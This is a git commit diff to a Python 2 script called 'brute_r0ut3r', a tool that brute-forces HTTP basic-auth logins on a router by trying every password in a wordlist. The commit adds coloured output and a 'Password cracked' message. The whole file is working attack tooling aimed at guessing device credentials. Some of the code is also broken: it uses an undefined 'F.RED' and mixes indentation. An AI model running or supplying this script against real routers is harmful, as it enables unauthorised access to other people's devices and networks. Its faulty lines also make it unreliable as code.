41ee0147ee11d21c4f3f8a3732b4ae35ad49575c
cr1pt0n <churrosgamer12@gmail.com>
2017-12-16 11:57:11 -0200

    Update brute_r0ut3rv1.0.py

--- brute_r0ut3rv1.0.py
+++ brute_r0ut3rv1.0.py
@@ -3,14 +3,25 @@
 import sys
 import os
 import argparse
+import time
+import requests
+
+RED = '\033[1;31m'
+BLUE = '\033[94m'
+BOLD = '\033[1m'
+GREEN = '\033[32m'
+OTRO = '\033[36m'
+YELLOW = '\033[33m'
+ENDC = '\033[0m'
+
 try:
 	import requests
 except:
-	install = raw_input('Opss, parece que você não tem o módulo (requests)\n deseja instalar (y/n)? ')
+	install = F.RED + raw_input('Opss, parece que você não tem o módulo (requests)\n deseja instalar (y/n)? ')
 	if(install == 'y'):
 		os.system('pip install requests')
 	else:
-		print '\nBye'
+		print F.BLUE + '\nBye'
 		sys.exit()
 
 parser = argparse.ArgumentParser(description='Coded by: RNX')
@@ -24,18 +35,18 @@ url = 'http://' + str(argumentos.target)
 login = argumentos.login
 
 def banner():
-	logo = '''
-	*******************************************
-	*    [!] Script Brute Force Router v1.0   *
-	*******************************************
-	              Coded by: RNX
-	'''
+	logo = ENDC + str('''
+	    *******************************************
+	    *    [!] Script Brute Force Router v1.2   *
+            *******************************************
+	                  Coded by: RNX
+	''')
 	print logo
 
 def help():
-	ajuda = '''
-	Use: python brute_r0ut3r.py --target <ip> --login <login> --passfile <wordlist>
-	'''
+	ajuda = ENDC + str('''
+	Use: python brute_r0ut3r.py -t <ip> -l <login> -p <wordlist>
+	''')
 	print ajuda
 
 def main():
@@ -57,21 +68,23 @@ def main():
 
 			for password_1 in password1:
 				passlist.append(password_1.rstrip())
-
 	except IOError:
-		print '[-] Wordlist not found!'
+		print RED + '[-] Wordlist not found!'
 		sys.exit()
-
+	print RED + str('Cracking...\n')
+	
 	for password in passlist:
 		envia_request = requests.get(url, auth=(login, password))
 		code = envia_request.status_code
+		if( code == 200 ):
+                    print RED + str('++ Password cracked ++\n\nLogin: {}\nPassword: {}').format(login, password)
+		    sys.exit()
 
-		if(code == 200):
-			print '[+] Password found => ' + str(password)
-			break
 		else:
-			print '[-] Password incorrect => ' + str(password)
-		
+			pass
+
+
+	print RED + 'Password not found !!!'
+
 if(__name__ == '__main__'):
 	main()
-	
